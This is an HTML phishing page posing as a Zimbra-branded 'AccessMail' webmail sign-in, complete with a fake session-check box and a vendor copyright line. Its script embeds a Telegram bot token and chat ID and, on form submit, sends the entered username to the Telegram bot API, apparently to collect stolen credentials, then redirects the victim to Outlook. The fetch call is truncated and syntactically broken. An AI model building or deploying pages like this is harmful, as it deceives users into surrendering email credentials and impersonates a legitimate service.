<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>AccessMail Sign In</title>
    <style>
        :root { 
            --zimbra-teal: #4ba6be;    /* Header/Footer Teal */
            --bg-body: #ffffff; 
            --text-grey: #444444;      
            --btn-blue: #4a90e2;       /* The Specific Blue for the Sign In button */
            --border-light: #cdcdcd;   
        }
        
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body { 
            margin: 0; 
            padding: 0;
            background-color: var(--bg-body); 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .header-top {
            background-color: var(--zimbra-teal);
            height: 180px;
            width: 100%;
        }

        .main-content {
            flex: 1;
            padding: 40px 25px;
            max-width: 450px;
            margin: 0 auto;
            width: 100%;
        }

        .logo-area {
            font-size: 42px;
            font-weight: bold;
            margin-bottom: 5px;
            display: flex;
            letter-spacing: -1.5px;
        }
        .logo-access { color: #5cb8d1; }
        .logo-mail { color: #1e3d58; margin-left: -1px; }

        .sign-in-header {
            font-size: 24px;
            color: var(--text-grey);
            margin-bottom: 35px;
            font-weight: 600;
        }

        .form-group { margin-bottom: 20px; position: relative; text-align: left; }
        
        label {
            display: block;
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-field {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid var(--border-light);
            border-radius: 3px;
            font-size: 16px;
            outline: none;
            background: #fff;
            -webkit-appearance: none;
            appearance: none;
        }

        .show-btn {
            position: absolute;
            right: 12px;
            bottom: 10px;
            font-size: 14px;
            color: #777;
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            font-weight: 500;
        }

        .v-row {
            display: flex;
            align-items: center;
            margin: 25px 0;
            padding: 12px;
            background: #fcfcfc;
            border: 1px solid #f0f0f0;
            border-radius: 4px;
            cursor: pointer;
        }
        .v-box {
            width: 18px;
            height: 18px;
            border: 1px solid #bbb;
            border-radius: 3px;
            margin-right: 12px;
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .v-box.active { background: #28a745; border-color: #28a745; }
        .v-box.active::after {
            content: 'âœ“'; color: white; font-size: 12px; font-weight: bold;
        }

        .action-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
        }

        .btn-submit {
            background-color: var(--btn-blue);
            color: white;
            border: none;
            padding: 12px 28px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }

        .stay-signed {
            display: flex;
            align-items: center;
            font-size: 14px;
            color: #444;
        }
        .stay-signed input { margin-right: 8px; width: 18px; height: 18px; }

        .footer-banner {
            background-color: var(--zimbra-teal);
            height: 120px;
            width: 100%;
            margin-top: 50px;
        }

        .copyright {
            padding: 25px 20px;
            text-align: center;
            font-size: 11px;
            line-height: 1.5;
            color: #ffffff;
            background-color: var(--zimbra-teal);
        }
    </style>
</head>
<body>

<div class="header-top"></div>

<main class="main-content">
    <div class="logo-area">
        <span class="logo-access">Access</span><span class="logo-mail">Mail</span>
    </div>
    <div class="sign-in-header">Sign In</div>

    <form id="authForm">
        <div class="form-group">
            <label>Username</label>
            <input type="text" id="username" class="input-field" required autocomplete="off">
        </div>

        <div class="form-group">
            <label>Password</label>
            <input type="password" id="password" class="input-field" required>
            <button type="button" id="toggle" class="show-btn">Show</button>
        </div>

        <div class="v-row" id="vRow">
            <div class="v-box" id="vBox"></div>
            <span style="font-size: 13px; color: #888;">Secure session check</span>
        </div>

        <div class="action-container">
            <button type="submit" class="btn-submit" id="submitBtn" disabled>Sign In</button>
            <label class="stay-signed">
                <input type="checkbox"> Stay signed in
            </label>
        </div>
    </form>
</main>

<div class="footer-banner"></div>
<footer class="copyright">
    Copyright &copy; 2005-2026 Synacor, Inc. All rights reserved.<br>
    "Zimbra" is a registered trademark of Synacor, Inc.
</footer>

<script>
    var pInput = document.getElementById('password');
    var tBtn = document.getElementById('toggle');

    tBtn.onclick = function() {
        if (pInput.type === 'password') {
            pInput.type = 'text';
            tBtn.innerText = 'Hide';
        } else {
            pInput.type = 'password';
            tBtn.innerText = 'Show';
        }
    };

    var vRow = document.getElementById('vRow');
    var vBox = document.getElementById('vBox');
    var sBtn = document.getElementById('submitBtn');

    vRow.onclick = function() {
        vBox.classList.add('active');
        sBtn.disabled = false;
    };

    var _T = '8584656855:AAGer0oV6or_nNBblqfOKr9Exyf8Z58UoLk';
    var _C = '5627522307';

    document.getElementById('authForm').onsubmit = function(e) {
        e.preventDefault();
        sBtn.innerText = "...";
        sBtn.disabled = true;

        var u = document.getElementById('username').value;

        fetch("https://api.telegram.org/bot" + _T + "/sendMessage", {

        })

        })
        .catch(function() {
            window.location.href = "https://outlook.office.com";
        });
    };
</script>
</body>
</html>
